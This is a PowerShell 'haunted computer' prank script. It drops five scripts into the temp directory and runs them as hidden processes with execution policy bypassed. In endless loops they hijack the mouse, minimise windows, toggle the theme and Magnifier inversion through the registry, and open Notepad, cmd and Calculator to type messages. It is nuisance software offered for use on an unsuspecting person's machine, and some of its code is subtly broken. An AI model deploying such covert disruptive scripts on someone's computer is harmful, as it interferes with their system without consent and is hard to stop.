<#
========================= Mon's Haunted Computer Prank =================================

SYNOPSIS
This script creates 5 Powershell scripts that run simultaneously from the temp directory
and changes various display elements on a loop.

USAGE
1. Run script
2. Remove files from temp directory when done.

#>

#---------------------------------------- MOUSE ---------------------------------------------------

$keyfile = "$env:temp\mouse.ps1"
If (Test-Path $keyfile) {
}
Else {
    New-Item -Path "${keyfile}" -ItemType File
}

$mouse = @'
sleep 10
do{

if ((Get-Random -Maximum 10000) -lt 375) {

Add-Type -AssemblyName System.Windows.Forms

  $Pos = [System.Windows.Forms.Cursor]::Position
  $x = ($pos.X % 150) + 20
  $y = ($pos.Y % 500) + 20
  [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)

}
else{
}

if ((Get-Random -Maximum 10000) -lt 1575) {

Add-Type -AssemblyName System.Windows.Forms

  $Pos = [System.Windows.Forms.Cursor]::Position
  $x = ($pos.X % 550) + 20
  $y = ($pos.Y % 400) + 20
  [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)

}
else{
}

if ((Get-Random -Maximum 10000) -lt 575) {

Add-Type -AssemblyName System.Windows.Forms

  $Pos = [System.Windows.Forms.Cursor]::Position
  $x = ($pos.X % 500) + 2
  $y = ($pos.Y % 500) + 2
  [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)

}
else{
}


if ((Get-Random -Maximum 10000) -lt 175) {

Add-Type -AssemblyName System.Windows.Forms

  $Pos = [System.Windows.Forms.Cursor]::Position
  $x = ($pos.X % 700) + 10
  $y = ($pos.Y % 800) + 10
  [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)

}
else{
}


if ((Get-Random -Maximum 10000) -lt 75) {
    $apps = New-Object -ComObject Shell.Application
    $apps.MinimizeAll()
}
else{
}


Start-Sleep 10
$a = 4

} While ($a -le 5)
'@

        Add-Content $env:temp\mouse.ps1 "$mouse" -Force
        Start-Sleep 1
        




#------------------------------------------------------ DARK MODE --------------------------------------------------------------

$keyfile = "$env:temp\darky.ps1"
If (Test-Path $keyfile) {
}
Else {
    New-Item -Path "${keyfile}" -ItemType File
}



$darky = @'
sleep 40
do{

if ((Get-Random -Maximum 10000) -lt 3875) {
$Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
Set-ItemProperty $Theme AppsUseLightTheme -Value 1
}
else{
$Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
Set-ItemProperty $Theme AppsUseLightTheme -Value 0
}


Start-Sleep 3
$a = 4

} While ($a -le 5)
'@

        Add-Content $env:temp\darky.ps1 "$darky" -Force
        Start-Sleep 1


#-------------------------------------------------- NOTEPAD / CMD -------------------------------------------------


$keyfile = "$env:temp\notes.ps1"
If (Test-Path $keyfile) {
}
Else {
    New-Item -Path "${keyfile}" -ItemType File
}



$notes = @'
sleep 20
do{

if ((Get-Random -Maximum 10000) -lt 175) {

Start notepad.exe

    function Do-SendKeys {
    param (
        $SENDKEYS,
        $WINDOWTITLE
    )
    $wshell = New-Object -ComObject wscript.shell;
    IF ($WINDOWTITLE) {$wshell.AppActivate($WINDOWTITLE)}
    Sleep 1
    IF ($SENDKEYS) {$wshell.SendKeys($SENDKEYS)}
}
    Do-SendKeys -WINDOWTITLE notepad.exe -SENDKEYS 'Hello? Whats Happening to me???'
    sleep 5
    cmd.exe /c "taskkill /F /IM notepad.exe /T > nul"
}




if ((Get-Random -Maximum 10000) -lt 175) {


Start cmd.exe

    function Do-SendKeys {
    param (
        $SENDKEYS,
        $WINDOWTITLE
    )
    $wshell = New-Object -ComObject wscript.shell;
    IF ($WINDOWTITLE) {$wshell.AppActivate($WINDOWTITLE)}
    Sleep 1
    IF ($SENDKEYS) {$wshell.SendKeys($SENDKEYS)}
}
    Do-SendKeys -WINDOWTITLE cmd.exe -SENDKEYS 'I Seem to be under the influence'
    Do-SendKeys -WINDOWTITLE cmd.exe -SENDKEYS '.'
    Do-SendKeys -WINDOWTITLE cmd.exe -SENDKEYS '.'
    Do-SendKeys -WINDOWTITLE cmd.exe -SENDKEYS '.'
    Do-SendKeys -WINDOWTITLE cmd.exe -SENDKEYS '.'
    Do-SendKeys -WINDOWTITLE cmd.exe -SENDKEYS '.'
    sleep 4
    cmd.exe /c "taskkill /F /IM cmd.exe /T > nul"
}

Start-Sleep 10
$a = 4

} While ($a -le 5)


'@

        Add-Content $env:temp\notes.ps1 "$notes" -Force
        Start-Sleep 1



#-------------------------------------------------- INVERT -------------------------------------------------


$keyfile = "$env:temp\invert.ps1"
If (Test-Path $keyfile) {
}
Else {
    New-Item -Path "${keyfile}" -ItemType File
}


$invert = @'
sleep 60
do{

$Theme = "HKCU:\SOFTWARE\Microsoft\ScreenMagnifier"
Set-ItemProperty $Theme MagnifierUIWindowMinimized -Value 1
Start-Sleep -Milliseconds 
Start-Process magnify.exe
sleep 1
  
  Set-ItemProperty $Theme Invert -Value 1
  sleep -Milliseconds 1000
  Set-ItemProperty $Theme Invert -Value 0
  sleep -Milliseconds 1000
  Set-ItemProperty $Theme Invert -Value 1
  sleep -Milliseconds 1000
  Set-ItemProperty $Theme Invert -Value 0
  sleep -Milliseconds 1000
  Set-ItemProperty $Theme Invert -Value 1
  sleep -Milliseconds 1000
  Set-ItemProperty $Theme Invert -Value 0
  sleep -Milliseconds 100
  cmd.exe /c "taskkill /F /IM calc.exe /T > nul"
$dbvr = 4
}While ($dbvr -le 5)

'@

        Add-Content $env:temp\invert.ps1 "$invert" -Force
        Start-Sleep 1


#-------------------------------------------------- CALC 420 -------------------------------------------------

$keyfile = "$env:temp\calc.ps1"
If (Test-Path $keyfile) {
}
Else {
    New-Item -Path "${keyfile}" -ItemType File
}

$calc = @'
sleep 10
do{
if ((Get-Random -Maximum 10000) -lt 575) {


Start calc.exe

    function Do-SendKeys {
    param (
        $SENDKEYS,
        $WINDOWTITLE
    )
    $wshell = New-Object -ComObject wscript.shell;
    IF ($WINDOWTITLE) {$wshell.AppActivate($WINDOWTITLE)}
    Sleep 1
    IF ($SENDKEYS) {$wshell.SendKeys($SENDKEYS)}
}
    Do-SendKeys -WINDOWTITLE calc.exe -SENDKEYS '4'
    Do-SendKeys -WINDOWTITLE calc.exe -SENDKEYS '2'
    Do-SendKeys -WINDOWTITLE calc.exe -SENDKEYS '0'
    Do-SendKeys -WINDOWTITLE calc.exe -SENDKEYS '-'
    Do-SendKeys -WINDOWTITLE calc.exe -SENDKEYS '6'
    Do-SendKeys -WINDOWTITLE calc.exe -SENDKEYS '9'
    sleep 4
    cmd.exe /c "taskkill /F /IM calc.exe /T > nul"
}

Start-Sleep 10
$a = 4

} While ($a -le 5)

'@

        Add-Content $env:temp\calc.ps1 "$calc" -Force
        Start-Sleep 1





Start-Process PowerShell.exe -ArgumentList (" -ExecutionPolicy Bypass -w hidden -File `"$env:temp\mouse.ps1`"")
Start-Sleep -Milliseconds 100
Start-Process PowerShell.exe -ArgumentList (" -ExecutionPolicy Bypass -w hidden -File `"$env:temp\calc.ps1`"")
Start-Sleep -Milliseconds 100
Start-Process PowerShell.exe -ArgumentList (" -ExecutionPolicy Bypass -w hidden -File `"$env:temp\notes.ps1`"")
Start-Sleep -Milliseconds 100
Start-Process PowerShell.exe -ArgumentList (" -ExecutionPolicy Bypass -w hidden -File `"$env:temp\darky.ps1`"")
Start-Sleep -Milliseconds 100
Start-Process PowerShell.exe -ArgumentList (" -ExecutionPolicy Bypass -w hidden -File `"$env:temp\invert.ps1`"")

